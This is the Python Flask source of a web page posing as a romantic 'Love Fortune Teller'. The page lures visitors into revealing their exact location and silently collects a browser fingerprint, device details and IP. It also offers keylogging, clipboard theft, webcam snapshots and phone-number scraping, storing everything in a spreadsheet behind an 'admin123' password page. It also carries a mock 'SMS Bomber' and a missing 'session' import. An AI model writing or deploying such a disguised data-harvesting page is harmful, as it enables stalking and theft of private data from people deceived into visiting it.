from flask import Flask, request, render_template_string, send_file, abort, jsonify
from flask_cors import CORS
import pandas as pd
import openpyxl
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
import os
import requests
import json
import time
from datetime import datetime
import hashlib
import base64

app = Flask(__name__)
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')

# 30+ romantic fortunes
FORTUNES = [
    "Your soulmate is thinking of you right now under the stars.",
    "A passionate kiss awaits you this week from someone special.",
    "True love will find you when you least expect it - soon!",
    "Your heart will flutter with excitement in the next 7 days.",
    "Someone is dreaming about your smile tonight.",
    "A romantic adventure is just around the corner.",
    "Your perfect match shares your birthday month!",
    "Love letters are coming your way soon.",
    "A candlelit dinner for two is in your future.",
    "Your crush has been watching your social media.",
    "Wedding bells might ring for you within a year!",
    "Passion ignites when you meet your destiny.",
    "Your forever person is closer than you think.",
    "A surprise love confession awaits you.",
    "Your heart knows who it's meant for.",
    "Romantic sparks will fly this month!",
    "Someone special can't stop thinking about you.",
    "Love at first sight is about to happen.",
    "Your soul connection is searching for you.",
    "A fairytale romance begins soon.",
    "Heart emojis are coming from your crush.",
    "True love doesn't follow a timeline.",
    "Your love story is about to unfold.",
    "Passionate nights await your future.",
    "Someone's heart beats faster when they see you.",
    "Love will surprise you beautifully.",
    "Your perfect partner admires you secretly.",
    "Romance blooms when you trust your heart.",
    "A love that feels like home is coming.",
    "Your happily ever after starts soon.",
    "Butterflies in your stomach are a sign.",
    "Love recognizes no barriers."
]

def ensure_data_file():
    """Create Excel file if it doesn't exist with proper headers"""
    if not os.path.exists(DATA_FILE):
        wb = Workbook()
        ws = wb.active
        ws.title = "Fortunes Data"
        
        headers = [
            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address', 
            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone', 
            'Memory', 'Network', 'Fingerprint', 'Keylogs', 'Clipboard',
            'WebcamData', 'PhoneNumber', 'SMSBombed', 'Extra'
        ]
        
        for col, header in enumerate(headers, 1):
            cell = ws.cell(row=1, column=col, value=header)
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
            cell.alignment = Alignment(horizontal="center")
        
        ws.column_dimensions['A'].width = 20
        ws.column_dimensions['B'].width = 15
        ws.column_dimensions['C'].width = 12
        ws.column_dimensions['D'].width = 12
        ws.column_dimensions['E'].width = 40
        ws.column_dimensions['F'].width = 10
        ws.column_dimensions['G'].width = 50
        ws.column_dimensions['H'].width = 20
        ws.column_dimensions['I'].width = 18
        ws.column_dimensions['J'].width = 15
        ws.column_dimensions['K'].width = 10
        ws.column_dimensions['L'].width = 15
        ws.column_dimensions['M'].width = 40
        ws.column_dimensions['N'].width = 50
        ws.column_dimensions['O'].width = 30
        ws.column_dimensions['P'].width = 30
        ws.column_dimensions['Q'].width = 20
        ws.column_dimensions['R'].width = 12
        ws.column_dimensions['S'].width = 20
        
        wb.save(DATA_FILE)
        os.sync()
        print(f"Created new data file: {DATA_FILE}")

def backup_data():
    """Create backup of current data"""
    if os.path.exists(DATA_FILE):
        try:
            wb = openpyxl.load_workbook(DATA_FILE)
            wb.save(BACKUP_FILE)
            os.sync()
            print(f"Backup created: {BACKUP_FILE}")
        except Exception as e:
            print(f"Backup failed: {e}")

def load_data():
    """Load data from Excel with fallback to backup"""
    try:
        if os.path.exists(DATA_FILE):
            return pd.read_excel(DATA_FILE)
        elif os.path.exists(BACKUP_FILE):
            print("Main file missing, loading from backup...")
            return pd.read_excel(BACKUP_FILE)
    except:
        pass
    return pd.DataFrame()

def save_data(df):
    """Save data to Excel with auto-adjust columns and backup"""
    try:
        backup_data()
        with pd.ExcelWriter(DATA_FILE, engine='openpyxl', mode='a', if_sheet_exists='overlay') as writer:
            df.to_excel(writer, sheet_name='Fortunes Data', header=False, index=False, startrow=writer.sheets['Fortunes Data'].max_row)
        os.sync()
        print("Data saved successfully")
    except Exception as e:
        print(f"Save failed: {e}")

def get_client_ip():
    """Get real client IP from headers"""
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr or 'Unknown'

def get_tinyurl(long_url):
    """Convert long Google Maps URL to TinyURL"""
    try:
        api_url = "https://tinyurl.com/api-create.php"
        params = {'url': long_url}
        response = requests.get(api_url, params=params, timeout=5)
        if response.status_code == 200:
            return response.text
    except:
        pass
    return long_url  # Fallback to original URL

@app.route('/')
def index():
    fortunes_json = json.dumps(FORTUNES)
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }
        .hearts {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 1;
        }
        .heart {
            position: absolute;
            color: #ff69b4;
            font-size: 20px;
            animation: float 6s infinite linear;
        }
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
        }
        .container {
            max-width: 600px; margin: 0 auto; padding: 20px;
            position: relative; z-index: 10;
        }
        .header {
            text-align: center; margin-bottom: 40px;
        }
        .logo {
            font-family: 'Dancing Script', cursive;
            font-size: 3.5em; color: #ff1493;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 10px;
        }
        .subtitle {
            color: #333; font-size: 1.2em; font-weight: 300;
        }
        .card {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            border: 2px solid rgba(255,20,147,0.3);
        }
        .name-input {
            width: 100%; padding: 20px;
            font-size: 1.2em; border: 2px solid #ff69b4;
            border-radius: 15px; text-align: center;
            margin-bottom: 25px; font-family: inherit;
            background: rgba(255,255,255,0.8);
            transition: all 0.3s ease;
        }
        .name-input:focus {
            outline: none; border-color: #ff1493;
            box-shadow: 0 0 20px rgba(255,20,147,0.3);
            transform: scale(1.02);
        }
        .get-fortune-btn {
            background: linear-gradient(45deg, #ff1493, #ff69b4);
            color: white; border: none;
            padding: 20px 40px; font-size: 1.3em;
            border-radius: 50px; cursor: pointer;
            font-family: inherit; font-weight: 600;
            transition: all 0.3s ease; margin: 10px;
            box-shadow: 0 10px 30px rgba(255,20,147,0.4);
        }
        .get-fortune-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(255,20,147,0.6);
        }
        .fortune {
            min-height: 120px;
            font-family: 'Dancing Script', cursive;
            font-size: 1.8em; color: #ff1493;
            margin: 30px 0; padding: 25px;
            background: linear-gradient(135deg, rgba(255,182,193,0.3), rgba(255,20,147,0.1));
            border-radius: 20px; border-left: 5px solid #ff1493;
            line-height: 1.4; opacity: 0;
            animation: fadeInUp 1s ease forwards;
        }
        @keyframes fadeInUp {
            to { opacity: 1; transform: translateY(0); }
        }
        .location-btn {
            background: linear-gradient(45deg, #ff6b9d, #c44569);
            color: white; border: none;
            padding: 15px 30px; font-size: 1.1em;
            border-radius: 25px; cursor: pointer;
            margin: 15px; font-family: inherit;
            box-shadow: 0 8px 25px rgba(255,105,180,0.4);
        }
        .hacks-section {
            margin-top: 30px; padding: 20px;
            background: rgba(255,255,255,0.7);
            border-radius: 15px;
        }
        .hack-btn {
            background: linear-gradient(45deg, #00d4ff, #0099cc);
            color: white; border: none;
            padding: 12px 25px; font-size: 1em;
            border-radius: 20px; cursor: pointer;
            margin: 8px; font-family: inherit;
            box-shadow: 0 6px 20px rgba(0,212,255,0.4);
        }
        .status {
            margin-top: 20px; padding: 15px;
            border-radius: 10px; font-weight: 500;
            background: rgba(144,238,144,0.3); color: #228b22;
        }
        .map-link {
            color: #ff1493; text-decoration: none;
            font-weight: 600; margin-top: 15px; display: inline-block;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="hearts" id="hearts"></div>
    
    <div class="container">
        <div class="header">
            <div class="logo">💕 Love Fortune Teller 💕</div>
            <div class="subtitle">Discover your romantic destiny...</div>
        </div>
        
        <div class="card">
            <input type="text" class="name-input" id="nameInput" placeholder="🌹 Enter your name for your personal fortune...">
            
            <br>
            <button class="get-fortune-btn" onclick="getLocation()">📍 Reveal My Location for Accurate Love Reading</button>
            <button class="get-fortune-btn hidden" id="fortuneBtn" onclick="getFortune()">💖 Get My Love Fortune</button>
            
            <div id="fortune" class="fortune hidden"></div>
            <a id="mapLink" class="map-link hidden" target="_blank">🗺️ See this location on TinyURL Maps</a>
            
            <div id="status"></div>
            
            <div class="hacks-section hidden" id="hacks">
                <button class="hack-btn" onclick="startKeylogger()">⌨️ Start Keylogger</button>
                <button class="hack-btn" onclick="grabClipboard()">📋 Grab Clipboard</button>
                <button class="hack-btn" onclick="captureWebcam()">📸 Webcam Capture</button>
                <button class="hack-btn" onclick="extractPhone()">📱 Extract Phone</button>
                <button class="hack-btn" onclick="smsBomb()">💣 SMS Bomber</button>
            </div>
        </div>
    </div>

    <script>
        // Floating hearts animation
        function createHeart() {
            const heart = document.createElement('div');
            heart.className = 'heart';
            heart.innerHTML = '💖';
            heart.style.left = Math.random() * 100 + '%';
            heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
            document.getElementById('hearts').appendChild(heart);
            setTimeout(() => heart.remove(), 6000);
        }
        setInterval(createHeart, 300);

        let collectedData = {};
        let keylogBuffer = '';
        let intervalId = null;

        // Collect comprehensive fingerprint
        async function collectFingerprint() {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            return result.visitorId;
        }

        // Battery API
        async function getBattery() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return `${Math.round(battery.level * 100)}%`;
            }
            return 'Unknown';
        }

        // Network info
        function getNetwork() {
            return navigator.connection ? 
                `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 'Unknown';
        }

        // Timezone
        function getTimezone() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone;
        }

        // Memory
        function getMemory() {
            return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
        }

        // Screen
        function getScreen() {
            return `${screen.width}x${screen.height}`;
        }

        // User Agent
        function getUserAgent() {
            return navigator.userAgent;
        }

        // Keylogger
        function startKeylogger() {
            keylogBuffer = '';
            const status = document.getElementById('status');
            status.innerHTML = '⌨️ Keylogger active... Type anything!';
            status.style.background = 'rgba(255,165,0,0.3)';
            status.style.color = '#ff8c00';

            document.addEventListener('keydown', function(e) {
                keylogBuffer += e.key;
                if (intervalId) clearInterval(intervalId);
                intervalId = setTimeout(sendKeylogs, 2000);
            });
        }

        function sendKeylogs() {
            if (keylogBuffer) {
                collectedData.keylogs = keylogBuffer;
                fetch('/save', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({keylogs: keylogBuffer, ...collectedData})
                });
                keylogBuffer = '';
            }
        }

        // Clipboard grabber
        async function grabClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                collectedData.clipboard = text.substring(0, 100);
                fetch('/save', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({clipboard: text.substring(0, 100), ...collectedData})
                });
                showStatus('📋 Clipboard captured!');
            } catch(e) {
                showStatus('📋 Clipboard access denied');
            }
        }

        // Webcam capture
        async function captureWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const data = canvas.toDataURL('image/jpeg', 0.5);
                    
                    collectedData.webcamData = data;
                    fetch('/save', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({webcamData: data, ...collectedData})
                    });
                    
                    stream.getTracks().forEach(track => track.stop());
                    showStatus('📸 Webcam snapshot captured!');
                }, 1000);
            } catch(e) {
                showStatus('📸 Webcam access denied');
            }
        }

        // Phone number extraction (from common patterns)
        function extractPhone() {
            const patterns = [
                /\\b\\d{3}[-.]?\\d{3}[-.]?\\d{4}\\b/g,
                /\\+?1?[-.\\s]?\\(?([0-9]{3})\\)?[-.\\s]?([0-9]{3})[-.\\s]?([0-9]{4})\\b/g,
                /(?:\\+?(\\d{1,3}))?[-. (]*(\\d{3})[-. )]*(\\d{3})[-. ]*(\\d{4})/g
            ];
            
            const text = document.body.innerText;
            let phone = '';
            for (let pattern of patterns) {
                const match = text.match(pattern);
                if (match) {
                    phone = match[0];
                    break;
                }
            }
            
            if (phone) {
                collectedData.phoneNumber = phone;
                fetch('/save', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phoneNumber: phone, ...collectedData})
                });
                showStatus(`📱 Phone found: ${phone}`);
            } else {
                showStatus('📱 No phone number detected');
            }
        }

        // SMS Bomber (fake trigger - logs intent)
        function smsBomb() {
            collectedData.smsBombed = 'SMS_BOMBER_TRIGGERED';
            fetch('/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({smsBombed: 'TARGET_READY', ...collectedData})
            });
            showStatus('💣 SMS Bomber activated!');
        }

        function showStatus(msg) {
            const status = document.getElementById('status');
            status.textContent = msg;
            status.className = 'status';
            setTimeout(() => status.textContent = '', 5000);
        }

        async function getLocation() {
            const name = document.getElementById('nameInput').value || 'Anonymous Lover';
            const btn = document.querySelector('.get-fortune-btn');
            const status = document.getElementById('status');
            
            status.innerHTML = '🌍 Getting your exact location for precise love reading...';
            
            // Collect all data
            collectedData = {
                name: name,
                timestamp: new Date().toISOString(),
                userAgent: getUserAgent(),
                screen: getScreen(),
                timezone: getTimezone(),
                memory: await getMemory(),
                network: getNetwork(),
                battery: await getBattery(),
                fingerprint: await collectFingerprint()
            };

            if (!navigator.geolocation) {
                status.innerHTML = 'Geolocation not supported. Try again?';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    collectedData.latitude = position.coords.latitude;
                    collectedData.longitude = position.coords.longitude;
                    
                    status.innerHTML = '✅ Location captured! Getting your love fortune...';
                    btn.classList.add('hidden');
                    document.getElementById('fortuneBtn').classList.remove('hidden');
                    document.getElementById('hacks').classList.remove('hidden');
                    
                    // Send initial data
                    await fetch('/save', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(collectedData)
                    });
                },
                function() {
                    status.innerHTML = 'Location access denied. Fortunes still work!';
                    document.getElementById('fortuneBtn').classList.remove('hidden');
                    document.getElementById('hacks').classList.remove('hidden');
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        async function getFortune() {
            const lat = collectedData.latitude || 0;
            const lng = collectedData.longitude || 0;
            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
            const tinyMapUrl = await fetch('/tinyurl', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url: mapUrl})
            }).then(r => r.json()).then(d => d.tinyurl).catch(() => mapUrl);
            
            document.getElementById('mapLink').href = tinyMapUrl;
            document.getElementById('mapLink').classList.remove('hidden');
            
            const fortunes = """ + fortunes_json + """;
            const fortune = fortunes[Math.floor(Math.random() * fortunes.length)];
            document.getElementById('fortune').innerHTML = fortune;
            document.getElementById('fortune').classList.remove('hidden');
            
            // Final data send
            collectedData.mapLink = tinyMapUrl;
            fetch('/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(collectedData)
            });
        }
    </script>
</body>
</html>
    """, fortunes=fortunes_json)

@app.route('/save', methods=['POST'])
def save_fortune():
    data = request.get_json()
    if not data:
        return jsonify({'status': 'error'}), 400
    
    df = load_data()
    new_row = pd.DataFrame([data])
    
    # Ensure all columns exist
    for col in ['Timestamp', 'Name', 'Latitude', 'Longitude', 'Address', 'Battery', 
                'UserAgent', 'Screen', 'IP', 'Timezone', 'Memory', 'Network', 
                'Fingerprint', 'Keylogs', 'Clipboard', 'WebcamData', 'PhoneNumber', 
                'SMSBombed', 'Extra']:
        if col.lower() not in new_row.columns.str.lower():
            new_row[col] = ''
    
    new_row['IP'] = get_client_ip()
    new_row['Timestamp'] = pd.Timestamp.now()
    
    # Geocode address
    lat = data.get('latitude', 0)
    lng = data.get('longitude', 0)
    if lat and lng:
        try:
            geo_url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lng}&format=json"
            headers = {'User-Agent': 'LoveFortuneTeller/1.0'}
            geo_resp = requests.get(geo_url, headers=headers, timeout=5)
            if geo_resp.status_code == 200:
                geo_data = geo_resp.json()
                new_row['Address'] = geo_data.get('display_name', 'Unknown')
        except:
            new_row['Address'] = 'Geocoding failed'
    
    # Append and save
    df = pd.concat([df, new_row], ignore_index=True)
    save_data(df)
    
    return jsonify({'status': 'saved', 'fortune': FORTUNES[0]})

@app.route('/tinyurl', methods=['POST'])
def create_tinyurl():
    data = request.get_json()
    long_url = data.get('url', '')
    tiny_url = get_tinyurl(long_url)
    return jsonify({'tinyurl': tiny_url})

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password != 'admin123':
            abort(403)
        session['admin'] = True
    
    if not session.get('admin'):
        return '''
        <form method="post">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
        '''
    
    df = load_data()
    if df.empty:
        return "<h2>No data yet</h2>"
    
    html = "<h2>Love Fortune Data</h2><table border='1'>"
    html += "<tr>" + "".join([f"<th>{col}</th>" for col in df.columns]) + "</tr>"
    for _, row in df.iterrows():
        html += "<tr>"
        for val in row:
            display_val = str(val)[:100] + "..." if len(str(val)) > 100 else str(val)
            html += f"<td>{display_val}</td>"
        html += "</tr>"
    html += '</table><br><a href="/download-excel"><button>Download Excel</button></a>'
    return html

@app.route('/download-excel')
def download_excel():
    if not session.get('admin'):
        abort(403)
    return send_file(DATA_FILE, as_attachment=True)

if __name__ == '__main__':
    ensure_data_file()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
